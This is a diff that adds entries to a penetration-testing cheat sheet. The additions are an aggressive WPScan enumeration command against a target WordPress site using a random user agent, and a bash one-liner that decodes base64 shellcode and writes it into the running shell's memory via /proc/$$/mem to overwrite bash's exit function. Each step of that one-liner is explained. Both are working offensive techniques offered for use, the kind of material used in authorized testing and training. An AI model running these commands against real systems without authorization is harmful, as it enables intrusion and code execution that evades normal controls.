@@ -156,6 +156,7 @@ Other great cheetsheets:
   - [11.2. Use Legacy Key Exchange Algorithm or Cipher with SSH](#112-use-legacy-key-exchange-algorithm-or-cipher-with-ssh)
   - [11.3. Convert text to Windows UTF-16 format on Linux](#113-convert-text-to-windows-utf-16-format-on-linux)
   - [11.4. Extract UDP pcap packet payload data](#114-extract-udp-pcap-packet-payload-data)
+  - [11.5. Execute Shellcode from Bash](#115-execute-shellcode-from-bash)
 
 # 3. Scanning and Enumeration
 
@@ -419,6 +420,17 @@ wpscan --url http://$VICTIM_IP/
 #     The URI of the login page if different from /wp-login.php
 # --random-user-agent
 #     Be a bit more stealthy
+# --update
+#     update the WPScan database before scanning
+
+# aggressive scan:
+wpscan --update \
+       --url http://$VICTIM_IP/ \
+       --enumerate ap,at,cb,dbe \
+       --detection-mode aggressive \
+       --random-user-agent \
+       --plugins-detection aggressive \
+       --plugins-version-detection aggressive
 ```
 
 ## 3.8. 88/749 Kerberos Enumeration
@@ -3607,3 +3619,19 @@ tshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload | tr -d '\n' | xxd
 # -e = chosen fields to display with '-T fields'
 # xxd: cannot combine '-r -p' like '-rp'
 ```
+
+## 11.5. Execute Shellcode from Bash
+
+```sh
+cd /proc/$$;exec 3>mem;echo "McBQaC8vc2hoL2JpbonjUFOJ4bALzYA=" | base64 -d | dd bs=1 seek=$(($((16#`cat maps | grep /bin/bash | cut -f1 -d- | head -n 1`)) + $((16#300e0))))>&3
+```
+
+Explained:
+
+-  cd into `/proc/$$/` to write to the current PID
+-  Create a file descriptor 3 and point it to mem so you an write to FD 3 in the proc’s memory.
+-  Echo shellcode as base64 and decode it
+-  Use `dd` to write to your memory starting at the output of seek
+   -  The line reads out the maps file showing the memory map of the bash process, then it greps for `/bin/bash` to find where it is loaded in memory. It gets the address with cut and head then converts it from base16 to decimal. It adds that number to `0x300e0`
+   -  `0x300e0` is the location of bash’s exit function in memory
+   -  Net result: You overwrite bash’s exit function with the shellcode
